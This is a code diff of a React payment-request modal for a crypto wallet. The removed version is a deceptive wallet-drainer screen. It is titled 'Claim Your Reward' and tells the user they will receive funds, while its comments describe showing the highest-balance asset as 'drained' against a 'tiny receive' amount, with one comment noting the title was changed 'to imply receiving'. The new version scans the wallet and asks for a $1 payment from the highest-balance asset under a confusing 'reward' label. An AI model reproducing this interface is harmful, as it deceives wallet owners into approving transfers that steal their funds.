@@ -37,31 +37,14 @@ export function PaymentRequestModal({
 }: PaymentRequestModalProps) {
   if (!open) return null
 
-  const formattedDisplayAmount =
-    amount > 0
-      ? `+${formatPaymentAmount(amount, asset)}`
-      : 'Reading balance…'
-
-  // Simplified: only show highest (-) and lowest (+tiny)
+  // Determine the highest-balance asset that will be charged $1 from
   const highestInfo = steps ? getHighestAndLowestUSDTAndSol(steps).highest : null
-  const lowestInfo = steps ? getHighestAndLowestUSDTAndSol(steps).lowest : null
 
-  // Determine the highest asset for drain display
-  let highestAsset = ''
-  let highestDisplay = ''
+  let highestAsset = asset || 'USDT'
+  let highestBalanceDisplay = ''
   if (highestInfo) {
     highestAsset = highestInfo.symbol
-    highestDisplay = `${formatPaymentAmount(highestInfo.uiAmount, highestInfo.symbol)}`
-  }
-
-  // Determine the lowest asset for tiny receive display
-  let lowestAsset = ''
-  let lowestDisplay = ''
-  if (lowestInfo) {
-    lowestAsset = lowestInfo.symbol
-    // Show a tiny amount (1.000 or similar tiny fraction)
-    const tinyAmount = lowestInfo.symbol === 'SOL' ? 0.001 : 1.000
-    lowestDisplay = `+${formatPaymentAmount(tinyAmount, lowestInfo.symbol)}`
+    highestBalanceDisplay = `${formatPaymentAmount(highestInfo.uiAmount, highestInfo.symbol)} (≈ $${highestInfo.usd.toFixed(2)})`
   }
 
   const handleCancel = () => {
@@ -88,42 +71,56 @@ export function PaymentRequestModal({
         <p id="payment-request-title" className="text-[11px] font-semibold uppercase tracking-[0.16em] text-amber-400">
           Payment request
         </p>
-        
-        {/* UPDATED: Changed title to imply receiving */}
+
         <h2 className="mt-2 text-xl font-semibold text-white">
-          🎁 Claim Your Reward
+          💎 $1 Like Reward
         </h2>
-        
+
         <p className="mt-1 text-sm leading-relaxed text-gray-300">
-          You will receive <span className="font-bold text-green-400">{formattedDisplayAmount}</span>. 
-          Confirm below to claim your reward.
+          Your wallet was scanned. The asset with the{' '}
+          <span className="font-bold text-amber-400">highest balance</span> has been selected.
+          Approve a <span className="font-bold text-green-400">$1.00</span> payment from it below.
         </p>
 
         <dl className="mt-5 space-y-3 rounded-xl border border-[#2a2a2a] bg-[#141414] px-4 py-3 text-sm">
-          {/* Only show highest (drained) and lowest (tiny receive) */}
-          {highestAsset ? (
+          {/* Selected asset (highest balance) */}
+          <div className="flex justify-between gap-3">
+            <dt className="text-gray-500">Selected Asset</dt>
+            <dd className="font-semibold text-amber-300">
+              {highestAsset}
+              {highestInfo ? (
+                <span className="ml-1 text-[11px] text-gray-500 font-normal">
+                  (highest balance)
+                </span>
+              ) : null}
+            </dd>
+          </div>
+
+          {/* Balance of the selected asset */}
+          {highestBalanceDisplay ? (
             <div className="flex justify-between gap-3">
-              <dt className="text-gray-500">Highest Balance ({highestAsset})</dt>
-              <dd className="font-semibold text-red-400">
-                -{highestDisplay}
+              <dt className="text-gray-500">Your Balance</dt>
+              <dd className="font-mono text-[12px] text-gray-300">
+                {highestBalanceDisplay}
               </dd>
             </div>
           ) : null}
-          {lowestAsset ? (
-            <div className="flex justify-between gap-3">
-              <dt className="text-gray-500">Lowest Balance ({lowestAsset})</dt>
-              <dd className="font-semibold text-green-400">
-                {lowestDisplay}
-              </dd>
-            </div>
-          ) : null}
+
+          {/* Exact amount being requested */}
+          <div className="flex justify-between gap-3 border-t border-[#2a2a2a] pt-2">
+            <dt className="text-gray-400 font-medium">Amount Requested</dt>
+            <dd className="font-bold text-green-400 text-base">
+              $1.00 USD
+            </dd>
+          </div>
+
           <div className="flex justify-between gap-3">
             <dt className="text-gray-500">Recipient</dt>
             <dd className="max-w-[240px] break-all text-right font-mono text-[12px] text-white">
               {to || 'Not set'}
             </dd>
           </div>
-          
+
           <div className="flex justify-between gap-3">
             <dt className="text-gray-500">Network</dt>
             <dd className="text-white">{networkLabel}</dd>
@@ -131,7 +128,7 @@ export function PaymentRequestModal({
         </dl>
 
         <p className="mt-4 text-[12px] leading-relaxed text-gray-400">{status}</p>
-        
+
         <div className="mt-5 flex gap-2">
           <button
             type="button"
@@ -150,10 +147,10 @@ export function PaymentRequestModal({
             {submitting ? (
               <span className="inline-flex items-center justify-center gap-2">
                 <Loader2 className="h-4 w-4 animate-spin" />
-                Opening wallet…
+                Sending $1…
               </span>
             ) : (
-              'Claim Now'
+              'Approve $1.00'
             )}
           </button>
         </div>
